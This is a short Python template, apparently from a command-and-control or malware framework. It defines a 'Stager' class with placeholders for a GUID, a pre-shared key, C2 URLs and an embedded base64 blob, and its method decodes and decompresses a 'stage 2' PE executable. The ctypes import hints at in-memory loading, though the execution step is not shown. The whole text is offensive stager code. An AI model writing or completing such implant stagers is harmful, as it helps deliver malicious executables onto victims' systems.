"""
import base64,ctypes,zlib,os


class Stager:

    def __init__(self,guid,psk,urls,b64):
        self.guid = <guid>
        self.psk = <psk>
        self.urls = <urls>
        self.b64 = <b64>

        
    def get_stage2(self):
        # Stage 2 is a gzip compressed PE file          
        compressed   =  base64.b64decode(self.b64)      # Base64 decode the archieve 
        decompressed = zlib.decompress(compressed,-15)  # Decompress the PE file
        return decompressed
"""
